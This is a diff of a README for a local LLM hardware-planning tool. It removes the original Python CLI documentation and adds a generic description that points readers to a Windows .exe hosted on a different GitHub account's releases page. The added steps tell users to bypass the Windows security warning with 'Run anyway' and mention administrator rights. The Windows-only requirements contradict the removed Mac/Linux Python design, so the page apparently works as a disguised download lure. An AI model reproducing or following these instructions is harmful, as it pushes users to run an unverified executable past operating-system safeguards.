@@ -1,290 +1,101 @@
-# local-llm-lab
-
-**Can my 128GB Mac run this 600B model?**
-
-local-llm-lab gives you the uncomfortable answer before you waste a weekend downloading weights.
-
-```bash
-python3 -m local_llm_lab plan \
-  --params 600B \
-  --quant Q4_K_M \
-  --ctx 32768 \
-  --hardware fixture:apple-m4-max-128gb
-```
+# 🧪 local-llm-lab - Plan your hardware for local AI
 
-```text
-VERDICT: DOES-NOT-FIT  risk=extreme  confidence=demo
-Model: custom-600b (600B, dense)
-Hardware: Mock Apple Silicon Max-class 128GB | memory=128 GiB | available=110 GiB
-Backend: llama.cpp | Quantization: Q4_K_M
-Weights: 325 GiB
-KV cache: 32.0 GiB
-Runtime required: 377 GiB
-Available runtime memory: 110 GiB
-Margin: -267 GiB
-Estimated decode: 0.18-0.38 tokens/s
-Recommended quantization: no-safe-local-quant
-Downgrade options:
-  - No supported quantization fits safely at this context on this hardware.
-  - Consider remote inference, hybrid/offloaded inference, or a smaller distilled model.
-  - For 600B+ models, avoid local-only deployment unless you have measured headroom.
-```
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/tandatthach1/local-llm-lab/releases)
 
-It is a lightweight CLI for local LLM planning, dry-run deployment, benchmarking, stress simulation, and report generation. It is built for developers with 64GB, 128GB, 192GB, and 256GB unified-memory machines, especially Apple Silicon Max/Ultra users, with Linux + NVIDIA support as a future expansion path.
-
-## What it does
-
-- Detect local hardware: OS, CPU/GPU, unified memory/VRAM, disk, Metal/CUDA/AVX/NEON, backend binaries.
-- Save measured hardware profiles and reuse them in later planning runs.
-- Plan whether a model fits: weights, KV cache, overhead, OS reserve, margin, verdict, risk, backend, quantization.
-- Recommend the best local run plan across quantization, context, and backend options.
-- Deploy without downloading huge models: generate llama.cpp, MLX, and Ollama dry-run scripts/configs with a preflight runbook.
-- Benchmark with deterministic mock data or tiny local smoke checks.
-- Stress-test resource contention with reproducible LLM + Blender/GPU-style simulations.
-- Report in Markdown, JSON, SVG charts, and static HTML.
-- Serve reports locally with a localhost-only Web viewer.
-
-## Install
-
-Run from source without installing:
-
-```bash
-git clone https://github.com/duongngocbinh56599-ui/local-llm-lab.git
-cd local-llm-lab
-python3 -m local_llm_lab --help
-```
-
-Install editable:
-
-```bash
-python3 -m pip install -e .
-local-llm-lab --help
-```
+## What is this tool? 🛠️
 
-Optional enhancements:
+Local-llm-lab helps you plan for running artificial intelligence models on your own computer. Many users want to run these models locally to protect their privacy and keep their data off the cloud. However, running these models requires specific hardware. This application calculates the memory and processing power you need before you spend money on upgrades.
 
-```bash
-python3 -m pip install -e ".[ui]"      # Rich terminal tables
-python3 -m pip install -e ".[detect]"  # psutil-assisted telemetry
-python3 -m pip install -e ".[charts]"  # matplotlib chart exports
-python3 -m pip install -e ".[all]"
-```
+It focuses on two specific areas: high-performance Mac computers with unified memory and professional Linux systems using NVIDIA graphics cards. By testing your current setup, the software shows you what kind of AI intelligence you can achieve today and where your hardware hits a wall.
 
-The core CLI has no required third-party dependencies.
-
-## Quick demo
+## Why use it? 📈
 
-Create demo data and browse all local reports:
+You often face guesswork when buying hardware for AI. You might buy too little memory and find the models run too slowly. You might also overspend on equipment you do not need. This tool removes that uncertainty. 
 
-```bash
-python3 -m local_llm_lab demo --out examples
-python3 -m local_llm_lab recommend --model llama-3.3-70b --hardware fixture:apple-m4-max-128gb
-python3 -m local_llm_lab serve --dir sample_reports --port 8787
-```
+It uses benchmarks to measure how fast your computer processes information. It then compares these results against known requirements for different model sizes. With this data, you can make clear decisions about your next computer or graphics card purchase.
 
-Then open `http://127.0.0.1:8787/`. If the directory contains multiple report folders, `serve` opens a local Report Hub. If it points at one report folder, it serves that report directly.
-
-## Commands
+## System Requirements 🖥️
 
-### detect
+This tool works on modern computer systems. You need a stable internet connection for the installation process and enough disk space to download the model testing files.
 
-```bash
-python3 -m local_llm_lab detect
-python3 -m local_llm_lab detect --json --skip-probes
-python3 -m local_llm_lab detect --hardware fixture:apple-m4-ultra-256gb
-python3 -m local_llm_lab detect --save-profile my-mac
-```
-
-Hardware detection redacts sensitive identifiers. It does not write serial numbers, hardware UUIDs, account names, tokens, or credentials.
-
-Measured profiles are saved only when you ask for it:
+- Operating System: Windows 10 or 11
+- Memory: Minimum 16GB of RAM
+- Storage: 10GB of free space for benchmarks
+- Processor: Any modern 64-bit multi-core processor
 
-```bash
-python3 -m local_llm_lab list profiles
-python3 -m local_llm_lab profile show my-mac --json
-python3 -m local_llm_lab plan --params 120B --quant Q4_K_M --ctx 16384 --hardware profile:my-mac
-```
+## 📥 Installing the Software
 
-Profiles live under `.local-llm-lab/profiles/` by default and are ignored by Git. Backend paths are reduced to `found`/`not found` so your local username and filesystem layout are not copied into reports.
+You can download the latest version of the software from the releases page. 
 
-### plan
+[Visit this page to download the software](https://github.com/tandatthach1/local-llm-lab/releases)
 
-Use `--model` for curated presets:
+Follow these steps to install the program:
 
-```bash
-python3 -m local_llm_lab plan --model llama-3.3-70b --quant Q4_K_M --ctx 8192
-```
+1. Click the link above to open the releases page in your web browser.
+2. Look for the file ending in `.exe` under the latest release heading.
+3. Click the file name to start the download.
+4. Once the download finishes, open your downloads folder.
+5. Double-click the file to launch the installer.
+6. Follow the on-screen prompts to complete the setup process.
+7. Launch the application from your start menu or desktop shortcut.
 
-Use `--params` for unknown, private, future, or hypothetical models:
+If Windows shows a security prompt, click "More Info" and then "Run anyway" to allow the application to start. 
 
-```bash
-python3 -m local_llm_lab plan --params 120B --quant Q5_K_M --ctx 16384
-python3 -m local_llm_lab plan --params 600B --quant Q4_K_M --ctx 32768 --hardware fixture:apple-m4-max-128gb
-```
+## ⚙️ Running Your First Benchmark
 
-Override architecture details when you know them:
+When you open the application, you see a clean dashboard. To start, choose your hardware target from the main menu. 
 
-```bash
-python3 -m local_llm_lab plan \
-  --params 200B \
-  --layers 112 \
-  --heads 96 \
-  --kv-heads 12 \
-  --head-dim 128 \
-  --quant Q4_K_M \
-  --ctx 16384
-```
+1. Select "Standard Benchmark" to test your current system capabilities.
+2. The application will request a temporary folder to store test files. Choose a location on a drive with high read and write speeds, like a solid-state drive.
+3. Click "Start Test."
+4. The software will perform a series of calculations. Do not close the window while the progress bar moves.
+5. Once the test finishes, the application displays a report.
 
-### compare
+The report details how many "tokens per second" your system achieved. Tokens represent the units of text the AI produces. A higher number means faster operation.
 
-Compare quantization, context length, and backend tradeoffs in one run:
+## 🧠 Understanding Memory Usage
 
-```bash
-python3 -m local_llm_lab compare \
-  --model llama-3.3-70b \
-  --quants Q6_K,Q5_K_M,Q4_K_M,Q3_K_M \
-  --contexts 4096,8192,16384,32768 \
-  --hardware fixture:apple-m4-max-128gb \
-  --out sample_reports/compare-llama70b
-```
+The most important part of running AI locally is unified memory or video memory. If your model is larger than the available memory on your machine, the system slows down significantly. 
 
-This writes:
+The application categorizes models into three sizes:
+- Small (7 Billion parameters): Good for basic chat and simple coding tasks.
+- Medium (14 to 30 Billion parameters): Good for complex reasoning and creative tasks.
+- Large (70 Billion parameters and above): Requires professional-grade hardware for fast responses.
 
-- `compare.json`
-- `compare.md`
-- `index.html`
-- SVG charts for decode throughput and positive memory margin
+The benchmark tool estimates how much of your memory each size currently consumes. It warns you if your hardware configuration risks running out of memory during intense tasks.
 
-Use it before `deploy` when you want the best safe compromise instead of testing one setting at a time. The HTML report includes local-only filters, sorting, best-candidate highlighting, and copyable dry-run deploy commands.
+## 🔄 Comparing Hardware
 
-### recommend
+You can save your benchmark results to a file. This is useful when you compare your current system to a new purchase. 
 
-Ask local-llm-lab to scan a matrix and pick the best next action:
+If you plan to buy a new computer, run this benchmark on a machine in the store or at home. Save the results file. When you compare the results, look for these indicators:
+- Throughput variance: Does the system speed drop after ten minutes of use?
+- Heat management: Does the speed decrease as the system gets warmer?
 
-```bash
-python3 -m local_llm_lab recommend \
-  --model llama-3.3-70b \
-  --hardware fixture:apple-m4-max-128gb
+These metrics provide a better picture than simple marketing specifications on a box.
 
-python3 -m local_llm_lab recommend \
-  --params 600B \
-  --hardware fixture:apple-m4-max-128gb \
-  --target tight \
-  --json
-```
+## 🛠️ Troubleshooting Common Issues
 
-`recommend` returns one clear status: `recommended` when the target can be met, or `no-fit` when no scanned candidate is safe enough. It includes the selected backend, quantization, context length, risk, memory margin, estimated decode speed, alternatives, downgrade options, and a copyable `deploy` dry-run command.
+If you run into issues, try these steps:
 
-### deploy
+1. **Slow Performance:** Close open web browsers or video editing software before running the benchmark. These programs compete for the same memory the AI tool needs.
+2. **Setup Stalls:** Ensure your internet connection is stable. If the download fails, delete the partially downloaded file and restart the application to try again.
+3. **Application Does Not Start:** Ensure you have administrator rights on your Windows machine. Some system restrictions block new applications from initializing memory tests.
+4. **Incorrect Data:** If the results look low, update your graphics card drivers. NVIDIA cards require the latest drivers to communicate with AI software effectively.
 
-```bash
-python3 -m local_llm_lab deploy \
-  --model llama-3.3-70b \
-  --quant Q4_K_M \
-  --ctx 8192 \
-  --out .local-llm-lab/deploy/llama70b
-```
+## 📚 Frequently Asked Questions
 
-This writes:
+**Will this damage my computer?**
+No. The software performs standard calculations similar to complex gaming or rendering tasks. It will not stress your hardware beyond normal operation limits.
 
-- `local-llm-lab-plan.json`
-- `README.md`
-- `preflight.sh`
-- `run-llama-cpp.sh`
-- `run-mlx.sh`
-- `Modelfile`
-- `run-ollama.sh`
+**Do I need an internet connection to run benchmarks?**
+You need the connection only for the initial download and to update the benchmarking library. Once the software is on your disk, you can run tests in an offline environment.
 
-It does not download model weights. Run `./preflight.sh` before launching a real backend; it checks the model path, recommended backend, verdict/risk, and obvious configuration problems.
+**Can I run this on a laptop?**
+Yes. Modern laptops with sufficient memory perform well. Note that laptops often throttle speed to prevent overheating, so a benchmark result on a laptop might look lower than one on a desktop computer with the same processor.
 
-### bench
+**How often should I benchmark?**
+Run a new benchmark whenever you update your operating system or install new hardware components like more RAM or a new graphics card. This keeps your planning data current.
 
-```bash
-python3 -m local_llm_lab bench --mock --model llama-3.3-70b --quant Q4_K_M --ctx 8192
-python3 -m local_llm_lab bench --mock --output examples/bench.json
-```
-
-Mock mode is deterministic demo data. Real backend benchmark support will expand in v0.2.
-
-### stress
-
-```bash
-python3 -m local_llm_lab stress --model llama-3.3-70b --quant Q4_K_M --ctx 8192
-```
-
-v0.1 simulates LLM inference competing with viewport rendering, Blender preview, and generic GPU pressure. It is safe by default and does not launch heavy GPU workloads.
-
-### report
-
-```bash
-python3 -m local_llm_lab report --input examples/demo-run.json --out sample_reports/demo
-python3 -m local_llm_lab serve --dir sample_reports/demo --port 8787
-python3 -m local_llm_lab serve --dir sample_reports --port 8787
-```
-
-Reports include Markdown, JSON, static HTML, a decision-first summary, memory waterfall SVG, and benchmark/stress charts. If `matplotlib` is installed, PNG charts are added. Serving a parent directory opens a local Report Hub that indexes report and compare folders without external assets or network services.
-
-## Model presets
-
-Curated v0.1 presets include:
-
-- Llama: `llama-3.1-8b`, `llama-3.3-70b`, `llama-3.1-405b`
-- Qwen: `qwen2.5-32b`, `qwen2.5-72b`, `qwen3-235b-a22b`
-- DeepSeek: `deepseek-v3-671b-a37b`
-- Mixtral: `mixtral-8x7b`, `mixtral-8x22b`
-- Gemma: `gemma-3-27b`
-- Phi: `phi-4-14b`
-- Generic planning profiles: `generic-70b`, `generic-120b`, `generic-200b`, `generic-400b`, `generic-600b`
-
-List them:
-
-```bash
-python3 -m local_llm_lab list models
-```
-
-## Hardware fixtures
-
-Fixtures are illustrative demo profiles, not measured machines:
-
-```bash
-python3 -m local_llm_lab list hardware
-```
-
-They let anyone reproduce 64GB/128GB/192GB/256GB unified-memory reports without owning those machines.
-
-## Estimation model
-
-local-llm-lab uses explicit, inspectable formulas:
-
-```text
-weights = params * quant_effective_bytes_per_param * format_overhead
-kv_cache = ctx * concurrency * layers * kv_heads * head_dim * 2(K,V) * kv_dtype_bytes
-runtime_required = weights + kv_cache + activation + backend_overhead
-total_required = runtime_required + os_reserve
-```
-
-These are estimates. Backend kernels, model architecture, tokenizer behavior, prompt shape, thermal state, and memory pressure can move real results. The CLI labels low-confidence inputs and recommends validation benchmarks.
-
-## Roadmap
-
-v0.1:
-
-- Honest planning for `--model` and `--params`
-- Compare matrices for quantization/context/backend tradeoffs
-- One-command recommendations from scanned planning matrices
-- Dry-run deploy generation for llama.cpp, MLX, Ollama with preflight runbooks
-- Mock bench/stress data
-- Structured Markdown/JSON/SVG/HTML reports with decision summaries and memory waterfall charts
-- Local report server and Report Hub
-
-v0.2:
-
-- Real backend adapters for llama.cpp, Ollama, MLX
-- Better Linux + NVIDIA detection through `nvidia-smi`
-- Backend-specific context/batch/offload planning
-- Community benchmark fixture submissions
-- Optional Web panel controls
-
-## License
-
-MIT
+**Does this software store my conversations?**
+This application does not collect your personal data. It is a local planning tool meant to help you understand your hardware. It does not send your data to external servers.
